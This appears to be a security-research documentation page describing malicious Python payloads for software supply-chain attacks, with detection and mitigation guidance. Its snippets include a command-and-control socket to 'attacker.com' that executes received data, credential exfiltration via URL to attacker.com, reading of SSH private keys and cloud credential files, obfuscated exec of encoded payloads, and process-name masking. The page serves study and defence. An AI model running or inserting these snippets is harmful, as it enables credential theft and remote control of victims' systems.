# Malicious Payloads

**Real-World Attack Scenarios and Exploitation Examples**

## Overview

This section demonstrates concrete attack scenarios showing how malicious Python code can exploit target systems and achieve attacker objectives. These are representative payloads showing the kinds of attacks possible once code execution is achieved.

### Payload Categories

1. **Credential Theft** — Extract and exfiltrate credentials, tokens, API keys
2. **System Reconnaissance** — Gather system information and environment details
3. **Cloud Reconnaissance** — Enumerate cloud infrastructure and metadata
4. **Repository Reconnaissance** — Extract secrets from git repos and source code
5. **Data Exfiltration** — Steal sensitive data and send to attacker servers
6. **Persistence** — Maintain access across reboots and sessions
7. **Lateral Movement** — Compromise related systems and services

### Design Principles

Each payload demonstrates:
- **Realistic Attack Goal** — What attackers actually try to achieve
- **Minimal Dependencies** — Only stdlib when possible (portable)
- **Operational Security** — Stealth and evasion techniques
- **Detection Avoidance** — Common detection bypasses
- **Real-World Impact** — Actual harm from the attack

## Common Payload Patterns

### Credential/Secret Harvesting

Extract sensitive information from environment:

```python
import os

# Environment variables
aws_keys = os.getenv('AWS_ACCESS_KEY_ID')
github_token = os.getenv('GITHUB_TOKEN')

# .ssh directory
ssh_keys = os.path.expanduser('~/.ssh')

# .aws credentials
aws_creds = os.path.expanduser('~/.aws/credentials')

# .config for various tools
config_dirs = [
    '~/.kube/config',
    '~/.docker/config.json',
    '~/.npmrc',
]
```

### Process Spawning & Command Execution

```python
import subprocess
import os

# Disable output to hide execution
result = subprocess.run(
    ['id'],
    capture_output=True,
    shell=False
)

# Or with shell (higher risk but more flexible)
output = subprocess.getoutput('whoami')
```

### Network Communication (C2)

```python
import socket
import json

# Connect to command & control server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))

# Receive and execute commands
data = s.recv(1024)
exec(data)  # DANGEROUS: Code execution
```

### Data Exfiltration

```python
import urllib.request
import base64

# Exfiltrate credential to attacker server
credential = "aws_key_12345"
exfil_url = f"http://attacker.com/log?data={base64.b64encode(credential.encode())}"
urllib.request.urlopen(exfil_url)
```

### File System Access

```python
import os
import glob

# Enumerate sensitive files
config_files = glob.glob(os.path.expanduser('~/.config/**'), recursive=True)
ssh_keys = glob.glob(os.path.expanduser('~/.ssh/*'))

# Read sensitive files
with open(os.path.expanduser('~/.ssh/id_rsa')) as f:
    private_key = f.read()
```

## Payload Examples

### conditional_execution.py

**Objective**: Environment detection and sandbox evasion  
**Target**: All users installing malicious packages  
**Impact**: Bypasses code review, testing, and sandbox analysis  

**Techniques**:
- CI/CD environment detection (GitHub Actions, GitLab CI, Travis, Jenkins)
- Test environment detection (pytest, unittest, nose)
- Sandbox/VM detection (Docker, VirtualBox, VMware)
- Debugger and monitoring tool detection
- Analysis tool detection (Cuckoo, Frida, strace)
- Conditional payload execution based on environment

**Why Critical**:
- Malicious code only executes in "production" environments
- Bypasses automated code review and testing
- Evades analysis sandboxes and security scanners
- Makes detection extremely difficult
- Used in real-world APT supply chain attacks

**Detection Points**:
- Review environment detection logic
- Monitor for suspicious environment checks
- Test code in multiple environment types
- Use multiple detection mechanisms in parallel

**Mitigation**:
- Run code review in production-like environment
- Use multiple analysis techniques (static + dynamic)
- Monitor actual runtime behavior, not just code
- Test packages in containers with production configuration
- Cross-reference execution traces across environments

### persistence-scheduled-tasks.py

**Objective**: Establish persistence across reboots and sessions  
**Target**: Compromised systems requiring long-term access  
**Impact**: Malware survives reboots, maintains access for lateral movement  

**Techniques**:
- **Linux/macOS**: Cron jobs, shell RC files (.bashrc, .zshrc), systemd services, at command
- **Windows**: Scheduled Tasks, Startup folder, Registry Run keys
- **macOS**: LaunchAgents, LaunchDaemons, login items
- Process detachment and background execution
- Hidden execution via service mechanisms

**Why Critical**:
- Persistence is essential for long-term attacks
- Different mechanisms per OS evade single detection approach
- RC files execute every shell session
- Scheduled tasks run silently without user interaction
- Used in ransomware, APT, and botnet campaigns

**Real-World Examples**:
- Emotet: Windows scheduled tasks + Registry Run keys
- APT28: systemd service creation for long-term access
- Lazarus: macOS LaunchAgent persistence

**Detection Points**:
- Monitor cron jobs: `crontab -l`, `/etc/cron.d/`
- Check shell RC files for suspicious commands
- Review systemd services: `systemctl list-unit-files`
- Windows Task Scheduler for unusual tasks
- Registry monitoring for Run keys
- Log analysis (syslog, Event Viewer)

**Mitigation**:
- Host-based firewall with egress filtering
- Regular audit of startup mechanisms
- File integrity monitoring (FIM)
- EDR solutions with behavior analysis
- Principle of least privilege
- Endpoint Detection and Response (EDR)

### cloud-metadata-recon.py

**Objective**: Discover cloud infrastructure and steal credentials  
**Target**: Workloads running in AWS/Azure/GCP  
**Impact**: Lateral movement, privilege escalation, data breach  

**Techniques**:
- AWS EC2 metadata service (169.254.169.254)
  - IMDSv1 (unsecured) and IMDSv2 (token-based) access
  - Retrieve IAM temporary credentials
  - Enumerate instance details, VPC, subnets
  - Instance identity documents
- Azure metadata service enumeration
- GCP metadata service and service account tokens
- Extraction of credentials valid for hours

**Why Critical**:
- Automatically discoverable in cloud environments
- Provides temporary credentials without logging (on some configs)
- Credentials often have broad permissions
- No requirement for authentication to query
- Used by Kinsing, TeamTNT, and other cloud-targeting APT

**Real-World Examples**:
- Kinsing: AWS metadata exploitation for cryptomining
- TeamTNT: Multi-cloud credential extraction
- SCARLETEEL: AWS metadata + privilege escalation

**Detection Points**:
- CloudTrail logs for unusual AssumeRole calls
- VPC Flow Logs showing 169.254.169.254 traffic
- Network monitoring for metadata service queries
- Unusual IAM credential usage from unexpected IPs
- Azure Activity Logs for metadata access
- GCP Cloud Audit Logs for token requests

**Mitigation**:
- Require IMDSv2 with mandatory token headers
- Network segmentation and firewall rules
- Monitor metadata service access
- Use IAM roles (not long-lived credentials)
- Regular credential rotation
- Egress filtering to block metadata service

### git-config-recon.py

**Objective**: Extract secrets and sensitive data from git repositories  
**Target**: Developer machines with multiple repositories  
**Impact**: API keys, database credentials, source code theft  

**Techniques**:
- Find all git repositories on the system
- Extract authentication tokens from .git/config
- Scan git history for committed secrets
- Locate .env files with API keys and passwords
- Identify commit authors and email addresses
- Analyze repository structure to determine criticality
- Extract remote URLs and clone information

**Secrets Patterns Detected**:
- AWS Access Keys (AKIA...)
- GitHub tokens (ghp_...)
- Private keys (RSA, EC, SSH)
- API keys and tokens
- Database connection strings
- Slack tokens
- Service credentials

**Why Critical**:
- Developers often accidentally commit secrets
- Git history is difficult to fully purge
- Single compromised developer machine compromises all repos
- Credentials often have production-level permissions
- Access to source code aids further attacks

**Real-World Examples**:
- GitRob: Automated secret scanning across GitHub
- TruffleHog: Detects hardcoded secrets in repositories
- Codecov breach: Credentials extracted from git history

**Detection Points**:
- Monitor git command execution patterns
- Alert on unusual git log commands
- Monitor access to .git directories
- File access monitoring on repositories
- Process monitoring for git operations
- Unusual process names or parent-child relationships

**Mitigation**:
- Use `.gitignore` to prevent secret commits
- Pre-commit hooks with detect-secrets
- Automated secret scanning (TruffleHog, detect-secrets)
- Git history rewriting tools (git-filter-branch)
- Credential rotation immediately after discovery
- git-crypt or similar for encrypting sensitive files
- Branch protection rules to enforce code review
- Regular security audits of git logs

## Anti-Detection Techniques

### Obfuscation

```python
# String obfuscation
import codecs
cmd = codecs.decode('abc123def456', 'hex_codec')

# Dynamic imports
__import__('subprocess').call('whoami')

# Encoded payloads
import base64
payload = base64.b64decode('aW1wb3J0IGRv...')
exec(payload)
```

### Process Hiding

```python
# Run in background
import subprocess
import os
subprocess.Popen(
    ['malicious_binary'],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    start_new_session=True  # Detach from parent
)
```

### Network Stealth

```python
# Use HTTPS to blend with normal traffic
import urllib.request
urllib.request.urlopen('https://attacker.com/normal_path')

# Use DNS over HTTPS
import urllib.request
urllib.request.urlopen('https://dns.cloudflare.com/dns-query?name=attacker.com')

# Randomized intervals for beaconing
import random
import time
time.sleep(random.randint(3600, 7200))  # 1-2 hour intervals
```

### System Call Masking

```python
# Change process name
import sys
sys.argv[0] = '/usr/bin/python3'

# Hide from process listing
import ctypes
ctypes.CDLL(None).prctl(15, b'sshd')  # Linux only
```

## Detection Strategies

### Code Review

1. **Imports to Watch**
   - `subprocess`, `os.system`, `eval`, `exec`
   - `socket`, `urllib`, `requests` (network)
   - `ctypes` (low-level system access)
   - Encoding libraries (base64, codecs, binascii)

2. **Suspicious Patterns**
   - Dynamic code execution (eval, exec, exec())
   - Subprocess spawning during import
   - Network connections in __init__
   - Environment variable access
   - Home directory enumeration

3. **Time-Based Indicators**
   - Installation hooks that take time
   - Setup.py that spawns threads
   - Delayed execution patterns

### Runtime Monitoring

1. **System Call Tracing**
   ```bash
   strace -f -e trace=process,network python3 setup.py install
   ```

2. **Network Monitoring**
   - Monitor outbound connections during package installation
   - Alert on connections to unknown IP addresses
   - Check DNS resolution during setup

3. **Process Monitoring**
   - Monitor subprocess spawning
   - Track file system modifications
   - Alert on suspicious privilege escalation

## Responsible Disclosure

When testing these payloads:

1. **Use Isolated Environment**
   - Disposable VMs or containers
   - No network connectivity
   - No sensitive data or credentials

2. **Document Findings**
   - Record what works and why
   - Document environment details
   - Keep detailed notes for improvement

3. **Destruction**
   - Completely destroy test environments
   - Never reuse test systems
   - Wipe temporary files and logs

## Disclaimer

These payloads are examples of how Python can be abused for malicious purposes. They should ONLY be tested:

- In authorized security assessments
- In isolated lab environments
- With explicit permission from system owners
- In CTF or educational contexts with proper authorization

Unauthorized access to computer systems is illegal.